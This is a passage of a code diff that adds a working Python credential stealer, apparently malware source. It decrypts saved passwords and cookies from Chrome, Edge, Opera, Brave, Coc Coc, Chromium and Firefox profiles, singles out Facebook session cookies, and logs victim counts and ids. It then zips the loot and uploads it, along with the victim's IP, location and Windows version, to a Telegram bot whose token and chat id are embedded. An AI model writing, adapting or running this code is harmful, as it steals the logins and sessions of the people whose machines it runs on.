+            shutil.rmtree(os.path.join(data_firefox,"profile"+str(i)))   
+def encrypt(data_profile):
+    login_db = os.path.join(data_profile, "Login Data")
+    key_db = os.path.join(data_profile ,"Local State",)
+    cookie_db = os.path.join(data_profile, "Cookies")
+    with open(key_db, "r", encoding="utf-8") as f:
+        local_state = f.read()
+        local_state = json.loads(local_state)
+    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+    master_key = master_key[5:]  
+    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
+    try :
+        conn = sqlite3.connect(login_db)
+        cursor = conn.cursor()
+        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
+        for r in cursor.fetchall():
+            url = r[0]
+            username = r[1]
+            encrypted_password = r[2]
+            iv = encrypted_password[3:15]
+            payload = encrypted_password[15:]
+            cipher = AES.new(master_key, AES.MODE_GCM, iv)
+            decrypted_pass = cipher.decrypt(payload)
+            decrypted_password = decrypted_pass[:-16].decode() 
+            with open((os.path.join(data_profile, "pass.txt")), 'a',encoding='utf-8') as f:
+                f.write("URL: " + url + "\t\t" + username + "|" + decrypted_password + "\n" + "\n")      
+    except :
+        print("sai me r ")
+    try:    
+        conn2 = sqlite3.connect(cookie_db)
+        conn2.text_factory = lambda b: b.decode(errors="ignore")
+        cursor2 = conn2.cursor()
+        cursor2.execute("""
+        SELECT host_key, name, value, encrypted_value,is_httponly,is_secure,expires_utc
+        FROM cookies
+        """)
+        json_data = []
+        for host_key, name, value,encrypted_value,is_httponly,is_secure,expires_utc in cursor2.fetchall():
+            if not value:
+                iv = encrypted_value[3:15]
+                encrypted_value = encrypted_value[15:]
+                cipher = AES.new(master_key, AES.MODE_GCM, iv)
+                decrypted_value = cipher.decrypt(encrypted_value)[:-16].decode()
+            else:
+                decrypted_value = value     
+            json_data.append({
+                "host": host_key,
+                "name": name,
+                "value": decrypted_value,
+                "is_httponly":is_httponly,
+                "is_secure":is_secure,
+                "expires_utc":expires_utc
+                })
+            
+        result = []
+        for item in json_data:
+            host = item["host"]
+            name = item["name"]
+            value = item["value"]
+            is_httponly= item["is_httponly"]
+            is_secure=item["is_secure"]
+            expires_utc = item["expires_utc"]
+            if host == ".facebook.com":
+                result.append(f"{name} = {value}")
+            if is_httponly == 1 : httponly = "TRUE"
+            else:httponly = "FAILSE"
+            if is_secure == 1 : secure = "TRUE"
+            else:secure = "FAILSE"
+            cookie = f"{host}\t{httponly}\t{'/'}\t{secure}\t\t{name}\t{value}\n"          
+            with open((os.path.join(data_profile, "cookie.txt")), 'a') as f:
+                f.write(cookie)
+        result_string = "; ".join(result)
+        with open((os.path.join(os.environ["TEMP"], name_f, "cookiefb.txt")), 'a',encoding='utf-8') as f:
+            f.write(result_string+"\n" + "\n")
+    except:
+        print("lai sai r ")
+def delete_file(data_profile):
+  
+    try:
+        encrypt(data_profile)
+    except:pass
+   
+
+def decryptMoz3DES( globalSalt, entrySalt, encryptedData ):
+  hp = sha1( globalSalt ).digest()
+  pes = entrySalt + b'\x00'*(20-len(entrySalt))
+  chp = sha1( hp+entrySalt ).digest()
+  k1 = hmac.new(chp, pes+entrySalt, sha1).digest()
+  tk = hmac.new(chp, pes, sha1).digest()
+  k2 = hmac.new(chp, tk+entrySalt, sha1).digest()
+  k = k1+k2
+  iv = k[-8:]
+  key = k[:24]
+  return DES3.new( key, DES3.MODE_CBC, iv).decrypt(encryptedData)
+
+def decodeLoginData(data):
+  asn1data = decoder.decode(b64decode(data)) # decodage base64, puis ASN1
+  key_id = asn1data[0][0].asOctets()
+  iv = asn1data[0][1][1].asOctets()
+  ciphertext = asn1data[0][2].asOctets()
+  return key_id, iv, ciphertext 
+def getLoginData(afkk):
+  logins = []
+  json_file = os.path.join(afkk ,"logins.json")
+  loginf = open( json_file, 'r',encoding='utf-8').read()
+  jsonLogins = json.loads(loginf)
+  for row in jsonLogins['logins']:
+    encUsername = row['encryptedUsername']
+    encPassword = row['encryptedPassword']
+    logins.append( (decodeLoginData(encUsername), decodeLoginData(encPassword), row['hostname']) )
+  return logins
+def decryptPBE(decodedItem, globalSalt): #PBE pour Password Based Encryption 
+  pbeAlgo = str(decodedItem[0][0][0])
+  if pbeAlgo == '1.2.840.113549.1.12.5.1.3': #pbeWithSha1AndTripleDES-CBC
+    entrySalt = decodedItem[0][0][1][0].asOctets()
+    cipherT = decodedItem[0][1].asOctets()
+    key = decryptMoz3DES( globalSalt, entrySalt, cipherT )
+    return key[:24]
+  elif pbeAlgo == '1.2.840.113549.1.5.13': #pkcs5 pbes2  
+    entrySalt = decodedItem[0][0][1][0][1][0].asOctets()
+    iterationCount = int(decodedItem[0][0][1][0][1][1])
+    keyLength = int(decodedItem[0][0][1][0][1][2])
+    k = sha1(globalSalt).digest()
+    key = pbkdf2_hmac('sha256', k, entrySalt, iterationCount, dklen=keyLength)    
+    iv = b'\x04\x0e'+decodedItem[0][0][1][1][1].asOctets()
+    cipherT = decodedItem[0][1].asOctets()
+    clearText = AES.new(key, AES.MODE_CBC, iv).decrypt(cipherT)
+    return clearText
+
+def getKey(afk):  
+    conn = sqlite3.connect(os.path.join(afk, "key4.db"))
+    c = conn.cursor()
+    c.execute("SELECT item1,item2 FROM metadata;")
+
+    row = c.fetchone()
+    globalSalt = row[0] 
+    item2 = row[1]
+    decodedItem2 = decoder.decode( item2 ) 
+    clearText = decryptPBE( decodedItem2, globalSalt )
+    
+    if clearText == b'password-check\x02\x02': 
+      c.execute("SELECT a11,a102 FROM nssPrivate;")
+      for row in c:
+        if row[0] != None:
+            break
+      a11 = row[0]
+      a102 = row[1] 
+      if a102 != None: 
+        decoded_a11 = decoder.decode( a11 )
+        clearText= decryptPBE( decoded_a11, globalSalt )
+        return clearText[:24]   
+    return None
+def encrypt_firefox(path_f):
+    try:
+        if os.path.exists(os.path.join(path_f ,"logins.json")):
+            key = getKey(path_f)
+            logins = getLoginData(path_f)
+
+            for i in logins:
+                username= unpad( DES3.new( key, DES3.MODE_CBC, i[0][1]).decrypt(i[0][2]),8 ) 
+                password= unpad( DES3.new( key, DES3.MODE_CBC, i[1][1]).decrypt(i[1][2]),8 ) 
+                str_pass =  password.decode('utf-8')
+                str_user =  username.decode('utf-8')
+                with open((os.path.join(path_f,"pass.txt")), 'a',encoding='utf-8') as f:
+                    f.write(i[2]+"          "+str_user + "|"+ str_pass + "\n")
+    except :
+        pass
+    try:
+        db_path = os.path.join(path_f, "cookies.sqlite")
+        db = sqlite3.connect(db_path) 
+        db.text_factory = lambda b: b.decode(errors="ignore")
+        cursor = db.cursor()
+        cursor.execute("""
+        SELECT id , name, value ,host
+        FROM moz_cookies
+        """)
+        json_data = []
+        for id , name, value ,host in cursor.fetchall():
+            json_data.append({
+                "host": host,
+                "name": name,
+                "value": value
+                
+            })
+        result = []
+        for item in json_data:
+            host = item["host"]
+            name = item["name"]
+            value = item["value"]
+            if host == ".facebook.com":
+                result.append(f"{name} = {value}")
+            cookie = f"{host}\t\t{'/'}\t\t\t{name}\t{value}\n"          
+            with open((os.path.join(path_f, "cookie.txt")), 'a') as f:
+                f.write(cookie)
+        result_string = "; ".join(result)
+        with open((os.path.join(os.environ["TEMP"], name_f, "cookiefb.txt")), 'a',encoding='utf-8') as f:
+            f.write(result_string+"\n" +  "\n")
+    except:
+        pass
+    
+def delete_firefox(data_firefox_profile):
+    
+    try:
+        encrypt_firefox(data_firefox_profile)
+    except: pass
+   
+def demso() :
+    path_demso = r"C:\Users\Public\Document\number.txt"
+    if os.path.exists(path_demso):
+        with open(path_demso, 'r') as file:
+            number = file.read()
+        number = int(number)+1
+        with open(path_demso, 'w') as file:
+            abc = str(number)
+            file.write(abc)
+    else:
+        with open(path_demso, 'w') as file:
+            file.write("1")
+            number = 1
+    return number
+
+
+def id() :
+    path_id = r"C:\Users\Public\Document\id.txt"
+    if os.path.exists(path_id):
+        with open(path_id, 'r') as file:
+            id = file.read()
+    else:
+        random_number = random.randint(10**14, 10**15 - 1)
+        id = str(random_number)
+        with open(path_id, 'w') as file:
+            file.write(id)
+    return id
+def time11() :
+    current_time = datetime.now()
+    formatted_time = current_time.strftime("%H:%M, %d/%m/%Y")
+    formatted_time2 = datetime.strptime(formatted_time, "%H:%M, %d/%m/%Y")
+    path_time = r"C:\Users\Public\Document\time.txt"
+    if os.path.exists(path_time):
+        with open(path_time, 'r') as file:
+            time_str = file.read().strip()
+            file_time = datetime.strptime(time_str, "%H:%M, %d/%m/%Y")
+        
+        time_diff = formatted_time2 - file_time
+        if time_diff < timedelta(minutes=30):
+            a = 0
+        else:
+            a = 1
+    
+    else :
+        with open(path_time, 'w') as file:
+            file.write(formatted_time + '\n')
+            a = 1
+    return a
+
+def main():
+    
+    data_path = os.path.join(os.environ["TEMP"], name_f);os.mkdir(data_path)
+   
+    chrome = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data")
+    firefox = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming","Mozilla", "Firefox", "Profiles")
+    Edge = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data")
+    Opera = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera Stable")
+    Brave = os.path.join(os.environ["USERPROFILE"], "AppData", "Local","BraveSoftware", "Brave-Browser", "User Data")
+    coccoc = os.path.join(os.environ["USERPROFILE"], "AppData", "Local","CocCoc", "Browser", "User Data")
+    chromium = os.path.join(os.environ["USERPROFILE"], "AppData", "Local","Chromium", "User Data")
+    if os.path.exists(chrome):
+        try:
+            get_chrome(data_path,chrome)
+        except: pass
+    if os.path.exists(Edge):
+        try:
+            get_edge(data_path,Edge)
+        except: pass
+        
+    if os.path.exists(Opera):
+        try:
+            get_opera(data_path,Opera)
+        except: pass
+        
+    if os.path.exists(Brave):
+        try:
+            get_brave(data_path,Brave)
+        except: pass
+        
+    if os.path.exists(coccoc):
+        try:
+             get_coccoc(data_path,coccoc)
+        except: pass
+       
+    if os.path.exists(firefox):
+        try:
+             get_firefox(data_path,firefox)
+        except: pass
+       
+    if os.path.exists(chromium):
+        try:
+           get_chromium(data_path,chromium)  
+        except: pass 
+Document_path = 'C:\\Users\\Public\\Document.zip'
+ 
+data_path = os.path.join(os.environ["TEMP"], name_f)
+z_ph = os.path.join(os.environ["TEMP"], name_f + '.zip')
+shutil.make_archive(z_ph[:-4], 'zip', data_path)
+url = 'https://api.telegram.org/bot6654794053:AAGIvnMwLPF-wDbcOduc-pcpqGvFy1fgPkI/sendDocument'
+number = "Data Lần Thứ: " + str(demso())
+
+data = {
+    'caption': "\n"+"Tỉnh/City:  " +ten_country +"\n" +"id :  " + id() +"\n"+ windows_version +"--"+ip + "\n"+ number + "\n",
+    'chat_id': 5582995200
+}
+
+try:
+    with open(z_ph, 'rb') as f:
+        response = requests.post(url, data=data, files={'document': f})
+        response.raise_for_status()  # Kiểm tra lỗi trong yêu cầu
+except Exception as e:
+    print("Error:", e)
+
+
+    
+    shutil.rmtree(os.environ["TEMP"], name_f +'.zip');shutil.rmtree(os.environ["TEMP"], name_f)
+    if os.path.exists(Document_path):
+        os.remove(Document_path)
+    
+
+if 'vn' in globals() and vn == '1':
+    if 'yes' not in globals():
+        if country_code == 'VN':
+            with open('watch.txt', 'w', encoding="utf-8") as f:
+                f.write('hello')
+        else:
+            main()
+    else:
+        main()
+elif 'vn' in globals() and vn == '2':
+    print('server stop')
+else:
+    print('ket noi that bai')
